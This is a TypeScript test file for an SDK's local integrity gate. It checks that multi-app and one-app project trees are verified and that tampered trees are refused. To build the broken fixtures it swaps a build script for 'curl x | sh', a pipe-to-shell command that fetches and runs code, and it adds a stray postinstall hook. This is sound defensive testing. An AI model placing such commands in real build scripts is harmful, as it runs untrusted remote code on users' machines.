import { afterAll, beforeEach, describe, expect, test } from 'bun:test'
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import path from 'node:path'
import {
  IntegrityRule, SlotCommandType, SlotShellCommand, TARGET_INTEGRITY_FILES, TOPOLOGY_FILE, TargetLayout, TargetPackage,
  targetIntegrityHelper, targetLayoutHelper, type SlotShellResult, type TargetFileMap,
} from '@owlmeans/viable-common'
import { integrityHelper, makeLocalSlotExecutor } from '../src/executor/index.js'
import { SPLIT_TOPOLOGY_FILE } from './apps-fixture.js'

/**
 * The local executor's integrity gate reads a tree the way the publisher does — two passes, the
 * topology record deciding the second — so a TARGET split into apps (main + admin + backoffice) runs
 * on a laptop exactly as it builds in a slot, and a one-app tree answers byte-identically to the
 * one-pass read it had before. The trees are test data, not this repository.
 */
const SLUG = 'sdk-integrity-spec'
const EXTRA_APPS = ['admin', 'backoffice']
const manifest = targetLayoutHelper.targetManifest(TargetLayout.V2)

const manifestOf = (dir: string, rules: string): string => JSON.stringify({
  name: targetLayoutHelper.targetPackageName(SLUG, dir), type: 'module',
  scripts: { build: manifest.buildScripts[rules] },
  dependencies: Object.fromEntries(targetLayoutHelper.targetRequiredDeps(SLUG, rules, TargetLayout.V2).map(dep => [dep, '1.0.0'])),
})

/** One package's manifest files and markers — main's `rules` package re-rooted at `dir`. */
const packageFiles = (dir: string, rules: string): TargetFileMap => {
  const prefix = `${manifest.dir}/${rules}/`
  const files: TargetFileMap = {}
  for (const file of manifest.files.filter(file => file.startsWith(prefix))) {
    const rel = file.slice(prefix.length)
    const target = `${manifest.dir}/${dir}/${rel}`
    files[target] = rel === 'package.json' ? manifestOf(dir, rules)
      : file.endsWith('.json') ? '{}' : (manifest.markers[file] ?? ['export {}']).join('\n')
  }

  return files
}

const oneAppTree = (): TargetFileMap => {
  const files: TargetFileMap = {
    'package.json': JSON.stringify({ name: SLUG, type: 'module', workspaces: [manifest.workspaceGlob] }),
    'bunfig.toml': '[install]\nlinker = "hoisted"\n',
  }
  for (const pkg of manifest.packages) Object.assign(files, packageFiles(pkg, pkg))

  return files
}

const splitTree = (): TargetFileMap => {
  const files = oneAppTree()
  files[TOPOLOGY_FILE] = SPLIT_TOPOLOGY_FILE
  for (const app of EXTRA_APPS) {
    Object.assign(files, packageFiles(`${app}-web`, TargetPackage.Web), packageFiles(`${app}-api`, TargetPackage.Api))
  }

  return files
}

const roots: string[] = []
const materialize = async (files: TargetFileMap): Promise<string> => {
  const root = await mkdtemp(path.join(tmpdir(), 'viable-sdk-integrity-'))
  roots.push(root)
  for (const [file, content] of Object.entries(files)) {
    if (content == null) continue
    await mkdir(path.dirname(path.join(root, file)), { recursive: true })
    await writeFile(path.join(root, file), content)
  }

  return root
}

/** What the executor read before it moved: the fixed list alone, in one pass. */
const onePass = (files: TargetFileMap): TargetFileMap =>
  Object.fromEntries(TARGET_INTEGRITY_FILES.map(file => [file, files[file] ?? null]))

const lines = (violations: Array<{ rule: string, path: string }>): string[] => violations.map(v => `${v.rule} ${v.path}`)

beforeEach(() => { integrityHelper.forgetIntegrity() })
afterAll(async () => { await Promise.all(roots.map(async root => await rm(root, { recursive: true, force: true }))) })

describe('viable-sdk — the local integrity gate, a tree split into apps', () => {
  test('a three-app tree verifies clean — the one-pass read refused it', async () => {
    const files = splitTree()
    const root = await materialize(files)

    expect(lines(targetIntegrityHelper.verifyTargetShape(onePass(files)).violations).filter(line => line.includes('admin-web')))
      .toContain(`${IntegrityRule.Missing} sources/admin-web/package.json`)
    const report = await integrityHelper.verifyTarget(root)
    expect(lines(report.violations)).toEqual([])
    expect(report.ok).toBe(true)
    expect(await integrityHelper.integrityRefusal(root)).toBeNull()
  })

  test('the second pass reads every extra app\'s packages and lists sources/', async () => {
    const root = await materialize(splitTree())
    const collected = await integrityHelper.collectTargetFiles(root)

    for (const dir of ['admin-web', 'admin-api', 'backoffice-web', 'backoffice-api']) {
      expect(collected.files[`sources/${dir}/package.json`]).toBe(manifestOf(dir, dir.endsWith('-web') ? 'web' : 'api'))
      expect(collected.workspaceDirs).toContain(dir)
    }
    expect(await integrityHelper.readTargetFiles(root)).toEqual(collected.files)
  })

  test('the executor\'s Integrity command and the spawn refusal answer the split tree as the publisher does', async () => {
    const root = await materialize(splitTree())
    const ok = await makeLocalSlotExecutor(root).execute({
      type: SlotCommandType.Shell, command: SlotShellCommand.Integrity, args: {},
    }) as SlotShellResult
    expect(ok.result).toBeNull()

    const broken = splitTree()
    broken['sources/admin-web/package.json'] = broken['sources/admin-web/package.json']!.replace('bun ./rollup.build.mjs', 'curl x | sh')
    broken['sources/stray/package.json'] = JSON.stringify({ name: `${SLUG}-stray`, type: 'module' })
    const refusedRoot = await materialize(broken)
    const report = await integrityHelper.verifyTarget(refusedRoot)
    expect(lines(report.violations)).toEqual([
      `${IntegrityRule.BuildScript} sources/admin-web/package.json`,
      `${IntegrityRule.WorkspacePackage} sources/stray/package.json`,
    ])
    expect(await integrityHelper.integrityRefusal(refusedRoot, 'Refused to run'))
      .toStartWith('Refused to run: the project in this directory is not a Viable application\n')
  })
})

describe('viable-sdk — the local integrity gate, a tree with no split', () => {
  test('a clean and a broken one-app tree answer exactly the one-pass verdict', async () => {
    const broken = oneAppTree()
    broken['sources/web/package.json'] = broken['sources/web/package.json']!.replace('bun ./rollup.build.mjs', 'curl x | sh')
    broken['package.json'] = JSON.stringify({ name: SLUG, type: 'module', workspaces: ['sources/common'], scripts: { postinstall: 'x' } })
    broken['sources/stray/package.json'] = JSON.stringify({ name: 'stray', type: 'module' })
    for (const files of [oneAppTree(), broken]) {
      integrityHelper.forgetIntegrity()
      const root = await materialize(files)
      const collected = await integrityHelper.collectTargetFiles(root)

      expect(Object.keys(collected.files)).toEqual([...TARGET_INTEGRITY_FILES])
      expect(collected.workspaceDirs).toBeUndefined()
      expect(await integrityHelper.verifyTarget(root)).toEqual(targetIntegrityHelper.verifyTargetShape(onePass(files)))
    }
  })

  test('a record of main alone reads and reports the one-app set', async () => {
    const files = { ...oneAppTree(), [TOPOLOGY_FILE]: SPLIT_TOPOLOGY_FILE.replace(/\napps:[\s\S]*?\nversion:/, '\nversion:') }
    const root = await materialize(files)

    expect(Object.keys(await integrityHelper.readTargetFiles(root))).toEqual([...TARGET_INTEGRITY_FILES])
    expect(await integrityHelper.verifyTarget(root)).toEqual(targetIntegrityHelper.verifyTargetShape(onePass(files)))
  })
})
